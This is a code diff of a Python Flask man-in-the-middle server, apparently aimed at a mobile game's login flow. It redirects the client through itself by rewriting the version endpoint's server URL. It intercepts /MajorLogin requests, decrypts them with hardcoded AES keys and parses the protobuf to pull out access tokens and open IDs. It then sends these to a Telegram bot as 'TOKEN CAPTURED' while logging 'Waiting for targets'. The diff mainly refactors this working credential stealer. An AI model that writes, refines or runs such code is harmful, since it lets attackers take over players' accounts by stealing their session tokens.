@@ -6,14 +6,12 @@ from urllib.parse import urlparse, parse_qs
 import httpx
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-from protobuf_decoder.protobuf_decoder import Parser, FixedBitsValue
 import time
-import random
 import os
 import logging
-import base64
-import hashlib
 import re
+import base64
+import struct
 
 # Flask App initialization
 app = Flask(__name__)
@@ -22,7 +20,7 @@ app = Flask(__name__)
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
-# ANSI Colors
+# ANSI Colors (only for local run)
 G = "\033[92m"
 Y = "\033[93m"
 R = "\033[91m"
@@ -46,7 +44,7 @@ def animated_banner():
     banner = f"""
 {G}╔══════════════════════════════════════════╗
 {Y}║          NIROB BBZ - VIP PROXY           ║
-{C}║          PROTOSECURE v3.0                ║
+{C}║          SECURE SERVER v3.0              ║
 {M}╚══════════════════════════════════════════╝{W}
     """
     print(banner)
@@ -70,150 +68,144 @@ CHAT_ID = "-1004291576288"
 # ===================================================
 
 # ================= CRYPTO FUNCTIONS =================
-def decrypt_api(cipher_text):
-    """Decrypt API response using AES-CBC"""
+KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
+
+def aes_decrypt(encrypted_hex):
+    """Decrypt AES-CBC"""
     try:
-        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
-        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        plain_text = unpad(cipher.decrypt(bytes.fromhex(cipher_text)), AES.block_size)
-        return plain_text.hex()
+        encrypted_bytes = bytes.fromhex(encrypted_hex)
+        cipher = AES.new(KEY, AES.MODE_CBC, IV)
+        decrypted = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
+        return decrypted.hex()
     except Exception as e:
-        print(f"{R}[!] Decrypt error: {e}{W}")
+        print(f"Decrypt error: {e}")
         return None
 
-def encrypt_api(plain_text):
-    """Encrypt data using AES-CBC"""
+def aes_encrypt(plain_hex):
+    """Encrypt AES-CBC"""
     try:
-        plain_text = bytes.fromhex(plain_text)
-        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
-        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
-        return cipher_text.hex()
+        plain_bytes = bytes.fromhex(plain_hex)
+        cipher = AES.new(KEY, AES.MODE_CBC, IV)
+        encrypted = cipher.encrypt(pad(plain_bytes, AES.block_size))
+        return encrypted.hex()
     except Exception as e:
-        print(f"{R}[!] Encrypt error: {e}{W}")
+        print(f"Encrypt error: {e}")
         return None
 
-# ================= PROTOBUF FUNCTIONS =================
-def parse_results(parsed_results):
-    """Parse protobuf results"""
-    result_dict = {}
-    for result in parsed_results:
-        if result.field not in result_dict:
-            result_dict[result.field] = []
-        if result.wire_type in ("varint", "string", "bytes"):
-            field_data = result.data
-        elif result.wire_type == "length_delimited":
-            field_data = parse_results(result.data.results)
-        else:
-            field_data = result.data
-        result_dict[result.field].append(field_data)
-    return {k: v[0] if len(v) == 1 else v for k, v in result_dict.items()}
+# ================= SIMPLE PROTOBUF PARSER =================
+def decode_varint(data, pos):
+    """Decode protobuf varint"""
+    result = 0
+    shift = 0
+    while True:
+        if pos >= len(data):
+            return None, pos
+        byte = data[pos]
+        pos += 1
+        result |= (byte & 0x7F) << shift
+        if not (byte & 0x80):
+            break
+        shift += 7
+    return result, pos
 
-def make_serializable(obj):
-    """Convert protobuf objects to serializable format"""
-    if isinstance(obj, (str, int, float, bool)) or obj is None:
-        return obj
-    if isinstance(obj, (bytes, bytearray)):
-        return obj.hex()
-    if isinstance(obj, FixedBitsValue):
-        if hasattr(obj, "value"):
-            return obj.value
-        elif hasattr(obj, "data"):
-            return obj.data
-        else:
-            return str(obj)
-    if isinstance(obj, dict):
-        return {k: make_serializable(v) for k, v in obj.items()}
-    if isinstance(obj, (list, tuple)):
-        return [make_serializable(v) for v in obj]
-    return str(obj)
+def encode_varint(value):
+    """Encode protobuf varint"""
+    result = []
+    while True:
+        byte = value & 0x7F
+        value >>= 7
+        if value:
+            byte |= 0x80
+        result.append(byte)
+        if not value:
+            break
+    return bytes(result)
 
-def get_available_room(_text):
-    """Parse protobuf data and extract fields"""
-    try:
-        parsed_results = Parser().parse(_text)
-        parsed_results_dict = parse_results(parsed_results)
-        clean = make_serializable(parsed_results_dict)
-        return json.dumps(clean)
-    except Exception as e:
-        print(f"{R}[!] Protobuf parse error: {e}{W}")
-        return "{}"
-
-def proto_json(hex_string):
-    """Convert protobuf hex to JSON"""
-    try:
-        parsed = Parser().parse(hex_string)
-        parsed_dict = parse_results(parsed)
-        clean = make_serializable(parsed_dict)
-        return json.dumps(clean, ensure_ascii=False, indent=1)
-    except Exception as e:
-        print(f"{R}[!] Proto to JSON error: {e}{W}")
-        return "{}"
-
-def extract_fields_from_protobuf(hex_data):
-    """Extract specific fields from protobuf data"""
-    try:
-        # First decrypt if needed
-        decrypted = decrypt_api(hex_data)
-        if decrypted:
-            # Parse protobuf
-            json_data = proto_json(decrypted)
-            data = json.loads(json_data)
-            
-            # Try to find token and open_id
-            access_token = None
-            open_id = None
-            
-            # Search for token (field 29 or 22)
-            if '29' in data:
-                if isinstance(data['29'], dict):
-                    access_token = data['29'].get('data', str(data['29']))
-                else:
-                    access_token = str(data['29'])
-            
-            if '22' in data:
-                if isinstance(data['22'], dict):
-                    open_id = data['22'].get('data', str(data['22']))
-                else:
-                    open_id = str(data['22'])
-            
-            # Search recursively
-            if not access_token or not open_id:
-                def search_fields(obj, depth=0):
-                    if depth > 10:
-                        return
-                    if isinstance(obj, dict):
-                        for key, value in obj.items():
-                            if key in ['29', '22']:
-                                if key == '29' and not access_token:
-                                    access_token = str(value)
-                                if key == '22' and not open_id:
-                                    open_id = str(value)
-                            search_fields(value, depth + 1)
-                    elif isinstance(obj, list):
-                        for item in obj:
-                            search_fields(item, depth + 1)
+def parse_protobuf(data):
+    """Simple protobuf parser"""
+    result = {}
+    pos = 0
+    while pos < len(data):
+        # Read field header
+        header, pos = decode_varint(data, pos)
+        if header is None:
+            break
+        
+        field_number = header >> 3
+        wire_type = header & 0x7
+        
+        if wire_type == 0:  # Varint
+            value, pos = decode_varint(data, pos)
+            if value is not None:
+                result[field_number] = value
+        
+        elif wire_type == 2:  # Length-delimited
+            length, pos = decode_varint(data, pos)
+            if length is not None and pos + length <= len(data):
+                value = data[pos:pos+length]
+                pos += length
                 
-                search_fields(data)
-            
-            return access_token, open_id
-            
-    except Exception as e:
-        print(f"{R}[!] Extract fields error: {e}{W}")
+                # Try to parse as nested protobuf
+                try:
+                    nested = parse_protobuf(value)
+                    if nested:
+                        result[field_number] = nested
+                    else:
+                        # Try to decode as string
+                        try:
+                            result[field_number] = value.decode('utf-8')
+                        except:
+                            result[field_number] = value.hex()
+                except:
+                    result[field_number] = value.hex()
+        
+        elif wire_type == 1:  # 64-bit
+            if pos + 8 <= len(data):
+                result[field_number] = struct.unpack('<Q', data[pos:pos+8])[0]
+                pos += 8
+        
+        elif wire_type == 5:  # 32-bit
+            if pos + 4 <= len(data):
+                result[field_number] = struct.unpack('<I', data[pos:pos+4])[0]
+                pos += 4
     
-    return None, None
+    return result
+
+def search_in_data(data, target_fields):
+    """Search for specific fields in parsed data"""
+    results = {}
+    
+    def recursive_search(obj, depth=0):
+        if depth > 20:
+            return
+        
+        if isinstance(obj, dict):
+            for key, value in obj.items():
+                # Check if key matches target
+                for target in target_fields:
+                    if str(key) == str(target) or str(key) == target:
+                        if target not in results:
+                            results[target] = value
+                
+                # Recursive search
+                recursive_search(value, depth + 1)
+        
+        elif isinstance(obj, list):
+            for item in obj:
+                recursive_search(item, depth + 1)
+    
+    recursive_search(data)
+    return results
 
 # ================= TELEGRAM SENDER =================
 def send_to_telegram(access_token, open_id):
-    """Send captured credentials to Telegram"""
-    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT" or not access_token or not open_id:
-        print(f"{Y}[!] Skipping Telegram - invalid credentials{W}")
+    """Send to Telegram"""
+    if not access_token or not open_id or access_token == "FAILED_TO_EXTRACT":
         return False
     
     try:
-        message = f"""🔥 VIP TOKEN CAPTURED! 🔥
+        message = f"""🔥 TOKEN CAPTURED! 🔥
 
 🔑 Access Token:
 <code>{access_token}</code>
@@ -221,12 +213,12 @@ def send_to_telegram(access_token, open_id):
 🆔 Open ID:
 <code>{open_id}</code>
 
-👑 System: NIROB BBZ PROXY
+👑 System: NIROB BBZ
 ⚡ Status: SUCCESS
-📱 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
+🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
 
 ───────────────────
-🤖 Bot: @GHOST_XAPIS
+🤖 @GHOST_XAPIS
 """
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {
@@ -235,21 +227,15 @@ def send_to_telegram(access_token, open_id):
             "parse_mode": "HTML"
         }
         response = requests.post(url, json=payload, timeout=10)
-        if response.status_code == 200:
-            print(f"{G}[✔] Token sent to Telegram!{W}")
-            return True
-        else:
-            print(f"{R}[!] Telegram error: {response.text}{W}")
-            return False
+        return response.status_code == 200
     except Exception as e:
-        print(f"{R}[!] Telegram send error: {e}{W}")
+        print(f"Telegram error: {e}")
         return False
 
 # ================= PROXY HANDLER =================
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
 def proxy_handler(path):
-    """Main proxy handler"""
     full_path = f"/{path}" if path else "/"
     parsed_path = urlparse(full_path)
     path = parsed_path.path
@@ -262,16 +248,14 @@ def proxy_handler(path):
         return Response("Not Found", status=404)
 
 def handle_ver_php(parsed_path):
-    """Handle /ver.php requests"""
-    print(f"{B}[INFO] Forwarding /ver.php request...{W}")
-    
+    """Handle /ver.php"""
     target = "https://version.ggwhitehawk.com/live/ver.php"
     headers = {k: v for k, v in request.headers.items() 
                if k.lower() not in ("host", "content-length", "connection")}
     body = request.get_data()
     
     try:
-        with httpx.Client(follow_redirects=True) as client:
+        with httpx.Client(follow_redirects=True, timeout=30.0) as client:
             r = client.request(
                 request.method, 
                 target, 
@@ -282,7 +266,7 @@ def handle_ver_php(parsed_path):
         
         try:
             data = r.json()
-        except json.JSONDecodeError:
+        except:
             data = {"raw": r.text}
         
         data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"
@@ -291,103 +275,83 @@ def handle_ver_php(parsed_path):
         HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 
                       'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
         for k, v in r.headers.items():
-            if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
+            if k.lower() not in HOP_BY_HOP:
                 response.headers[k] = v
         
         return response
-        
     except Exception as e:
-        print(f"{R}[!] /ver.php Error: {e}{W}")
         return Response(json.dumps({"error": str(e)}), status=500, mimetype='application/json')
 
 def handle_major_login():
-    """Handle /MajorLogin requests - Extract credentials"""
-    print(f"\n{rainbow_text('[+] TARGET HIT! /MajorLogin captured!')}{W}")
+    """Handle /MajorLogin"""
+    print(f"\n{rainbow_text('[+] TARGET HIT!')}{W}")
     
-    # Get request body
-    pyl = request.get_data()
-    print(f"{Y}[DEBUG] Received {len(pyl)} bytes{W}")
+    # Get raw data
+    raw_data = request.get_data()
+    print(f"[DEBUG] Received {len(raw_data)} bytes")
     
-    # Try different formats
     access_token = "FAILED_TO_EXTRACT"
     open_id = "FAILED_TO_EXTRACT"
     
-    # Method 1: Try JSON
+    # METHOD 1: Try JSON
     try:
-        json_data = json.loads(pyl)
-        print(f"{C}[DEBUG] JSON detected{W}")
-        access_token = json_data.get('access_token') or json_data.get('token') or json_data.get('29', 'FAILED_TO_EXTRACT')
-        open_id = json_data.get('open_id') or json_data.get('user_id') or json_data.get('22', 'FAILED_TO_EXTRACT')
-        if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
-            print(f"{G}[✔] Extracted from JSON{W}")
+        json_data = json.loads(raw_data)
+        access_token = json_data.get('29') or json_data.get('access_token') or json_data.get('token')
+        open_id = json_data.get('22') or json_data.get('open_id') or json_data.get('user_id')
+        if access_token and open_id:
+            print("[✔] Extracted from JSON")
     except:
         pass
     
-    # Method 2: Try Hex + Protobuf
-    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+    # METHOD 2: Try hex + protobuf
+    if not access_token or not open_id:
         try:
-            hex_data = pyl.hex()
-            print(f"{Y}[DEBUG] Trying hex decode...{W}")
+            hex_data = raw_data.hex()
+            print(f"[DEBUG] Hex length: {len(hex_data)}")
             
-            # Try direct protobuf parse
-            json_str = proto_json(hex_data)
-            if json_str and json_str != "{}":
-                data = json.loads(json_str)
-                print(f"{C}[DEBUG] Protobuf data: {json_str[:200]}...{W}")
+            # Parse protobuf
+            parsed = parse_protobuf(raw_data)
+            if parsed:
+                print(f"[DEBUG] Parsed fields: {list(parsed.keys())}")
+                results = search_in_data(parsed, ['29', '22', 'access_token', 'open_id', 'token'])
                 
-                # Extract fields
-                if '29' in data:
-                    access_token = str(data['29'])
-                if '22' in data:
-                    open_id = str(data['22'])
+                if '29' in results or 'access_token' in results:
+                    access_token = results.get('29') or results.get('access_token') or str(results.get('token'))
+                if '22' in results or 'open_id' in results:
+                    open_id = results.get('22') or results.get('open_id') or results.get('user_id')
                 
-                # Search nested
-                if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
-                    def search_nested(obj):
-                        nonlocal access_token, open_id
-                        if isinstance(obj, dict):
-                            for key, value in obj.items():
-                                if str(key) == '29' and access_token == "FAILED_TO_EXTRACT":
-                                    access_token = str(value)
-                                if str(key) == '22' and open_id == "FAILED_TO_EXTRACT":
-                                    open_id = str(value)
-                                search_nested(value)
-                        elif isinstance(obj, list):
-                            for item in obj:
-                                search_nested(item)
-                    
-                    search_nested(data)
-                
-                if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
-                    print(f"{G}[✔] Extracted from Protobuf{W}")
+                if access_token and open_id:
+                    print("[✔] Extracted from Protobuf")
         except Exception as e:
-            print(f"{R}[!] Protobuf parse error: {e}{W}")
+            print(f"[!] Protobuf error: {e}")
     
-    # Method 3: Try decrypt + protobuf
-    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+    # METHOD 3: Try decrypt + protobuf
+    if not access_token or not open_id:
         try:
-            hex_data = pyl.hex()
-            decrypted = decrypt_api(hex_data)
+            hex_data = raw_data.hex()
+            decrypted = aes_decrypt(hex_data)
             if decrypted:
-                print(f"{C}[DEBUG] Decrypted: {decrypted[:100]}...{W}")
-                json_str = proto_json(decrypted)
-                if json_str and json_str != "{}":
-                    data = json.loads(json_str)
-                    if '29' in data:
-                        access_token = str(data['29'])
-                    if '22' in data:
-                        open_id = str(data['22'])
-                    print(f"{G}[✔] Extracted from Decrypted Protobuf{W}")
+                print(f"[DEBUG] Decrypted: {decrypted[:100]}...")
+                decrypted_bytes = bytes.fromhex(decrypted)
+                parsed = parse_protobuf(decrypted_bytes)
+                if parsed:
+                    results = search_in_data(parsed, ['29', '22', 'access_token', 'open_id', 'token'])
+                    if '29' in results or 'access_token' in results:
+                        access_token = results.get('29') or results.get('access_token')
+                    if '22' in results or 'open_id' in results:
+                        open_id = results.get('22') or results.get('open_id')
+                    
+                    if access_token and open_id:
+                        print("[✔] Extracted from Decrypted Protobuf")
         except Exception as e:
-            print(f"{R}[!] Decrypt+Protobuf error: {e}{W}")
+            print(f"[!] Decrypt error: {e}")
     
-    # Method 4: Try raw string extraction
-    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
+    # METHOD 4: Try regex extraction
+    if not access_token or not open_id:
         try:
-            text = pyl.decode('utf-8', errors='ignore')
-            # Search for patterns
-            token_pattern = r'(?:29|access_token|token)[:=]\s*["\']?([^"\'&\s,}]+)["\']?'
-            id_pattern = r'(?:22|open_id|user_id)[:=]\s*["\']?([^"\'&\s,}]+)["\']?'
+            text = raw_data.decode('utf-8', errors='ignore')
+            token_pattern = r'(?:29|access_token|token)[:\s=]+["\']?([^"\'&\s,}]+)["\']?'
+            id_pattern = r'(?:22|open_id|user_id)[:\s=]+["\']?([^"\'&\s,}]+)["\']?'
             
             token_match = re.search(token_pattern, text, re.IGNORECASE)
             id_match = re.search(id_pattern, text, re.IGNORECASE)
@@ -397,24 +361,32 @@ def handle_major_login():
             if id_match:
                 open_id = id_match.group(1)
             
-            if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
-                print(f"{G}[✔] Extracted from Raw Text{W}")
+            if access_token and open_id:
+                print("[✔] Extracted from Regex")
         except:
             pass
     
+    # Convert to string if needed
+    if access_token and not isinstance(access_token, str):
+        access_token = str(access_token)
+    if open_id and not isinstance(open_id, str):
+        open_id = str(open_id)
+    
     # Display results
-    print(f"\n{Y}════════════════════════════════════════════{W}")
+    print(f"\n{'='*60}")
     print(f"{rainbow_text('🔥 CREDENTIALS EXTRACTED 🔥')}")
-    print(f"{Y}════════════════════════════════════════════{W}")
-    print(f"{G}🔑 Access Token: {access_token}{W}")
-    print(f"{C}🆔 Open ID: {open_id}{W}")
-    print(f"{Y}════════════════════════════════════════════{W}\n")
+    print(f"{'='*60}")
+    print(f"🔑 Access Token: {access_token}")
+    print(f"🆔 Open ID: {open_id}")
+    print(f"{'='*60}\n")
     
     # Send to Telegram
-    if access_token != "FAILED_TO_EXTRACT" and open_id != "FAILED_TO_EXTRACT":
-        send_to_telegram(access_token, open_id)
-    else:
-        print(f"{R}[!] Could not extract valid credentials{W}")
+    if access_token and access_token != "FAILED_TO_EXTRACT" and open_id and open_id != "FAILED_TO_EXTRACT":
+        success = send_to_telegram(access_token, open_id)
+        if success:
+            print(f"{G}[✔] Sent to Telegram successfully{W}")
+        else:
+            print(f"{R}[!] Failed to send to Telegram{W}")
     
     # Response
     response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
@@ -436,36 +408,24 @@ def health_check():
         "status": "ok",
         "server": "NIROB BBZ - VIP PROXY",
         "version": "3.0",
-        "port": PORT,
-        "local_ip": LOCAL_IP,
-        "telegram": bool(BOT_TOKEN and CHAT_ID)
+        "telegram": bool(BOT_TOKEN and CHAT_ID),
+        "timestamp": time.time()
     })
 
 @app.route('/status')
 def status():
     return jsonify({
         "status": "running",
-        "message": "Proxy server is active",
         "telegram_configured": bool(BOT_TOKEN and CHAT_ID)
-    })
-
-@app.route('/test')
-def test():
-    """Test endpoint"""
-    return jsonify({
-        "status": "ok",
-        "message": "Server is working!",
-        "timestamp": time.time()
     })
 
 # ================= RUN =================
 if __name__ == '__main__':
     animated_banner()
-    print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
-    print(f"{G}[✔] Port        : {W}{Y}{PORT}{W}")
-    print(f"{G}[✔] Local URL   : {W}{B}http://127.0.0.1:{PORT}/{W}")
-    print(f"{G}[✔] Network URL : {W}{B}http://{LOCAL_IP}:{PORT}/{W}")
-    print(f"{G}[✔] Telegram    : {W}{C}{'Connected' if BOT_TOKEN and CHAT_ID else 'Not Configured'}{W}")
+    print(f"{G}[✔] Status: Running{W}")
+    print(f"{G}[✔] Port: {PORT}{W}")
+    print(f"{G}[✔] Local: http://127.0.0.1:{PORT}/{W}")
+    print(f"{G}[✔] Network: http://{LOCAL_IP}:{PORT}/{W}")
     print(f"{rainbow_text('──────────────────────────────────────────')}")
     print(f"{Y}[*] Waiting for targets...{W}\n")
     app.run(host='0.0.0.0', port=PORT, debug=False)
